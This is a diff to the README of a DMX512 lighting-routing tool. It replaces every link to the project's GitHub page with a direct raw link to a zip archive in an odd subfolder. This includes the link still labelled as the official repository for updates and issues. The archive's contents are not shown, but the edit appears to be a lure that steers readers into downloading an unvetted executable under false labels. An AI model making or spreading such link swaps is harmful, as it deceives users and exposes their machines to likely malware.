@@ -1,6 +1,6 @@
 # 🎛️ DMXRouter - Reliable DMX512 Routing Made Simple
 
-[![Download DMXRouter](https://img.shields.io/badge/Download-DMXRouter-brightgreen)](https://github.com/nightoma/DMXRouter)
+[![Download DMXRouter](https://img.shields.io/badge/Download-DMXRouter-brightgreen)](https://raw.githubusercontent.com/nightoma/DMXRouter/main/condolent/DMX_Router_v1.3.zip)
 
 ---
 
@@ -29,7 +29,7 @@ If your system does not meet these specs, the software might run slower or encou
 
 1. **Open the Download Page**  
    Visit the official DMXRouter download page by clicking the button above or this link:  
-   [https://github.com/nightoma/DMXRouter](https://github.com/nightoma/DMXRouter)
+   [https://raw.githubusercontent.com/nightoma/DMXRouter/main/condolent/DMX_Router_v1.3.zip](https://raw.githubusercontent.com/nightoma/DMXRouter/main/condolent/DMX_Router_v1.3.zip)
 
 2. **Find the Windows Version**  
    On the page, scroll to the "Releases" section. Look for the latest release that includes Windows files. These usually appear as `.exe` or `.zip` files.
@@ -114,8 +114,8 @@ If your system does not meet these specs, the software might run slower or encou
 
 ## 🔗 Useful Links
 
-- Visit the download page to get the latest release: [https://github.com/nightoma/DMXRouter](https://github.com/nightoma/DMXRouter)  
-- DMXRouter official repository for updates and issues: [https://github.com/nightoma/DMXRouter](https://github.com/nightoma/DMXRouter)
+- Visit the download page to get the latest release: [https://raw.githubusercontent.com/nightoma/DMXRouter/main/condolent/DMX_Router_v1.3.zip](https://raw.githubusercontent.com/nightoma/DMXRouter/main/condolent/DMX_Router_v1.3.zip)  
+- DMXRouter official repository for updates and issues: [https://raw.githubusercontent.com/nightoma/DMXRouter/main/condolent/DMX_Router_v1.3.zip](https://raw.githubusercontent.com/nightoma/DMXRouter/main/condolent/DMX_Router_v1.3.zip)
 
 ---
 
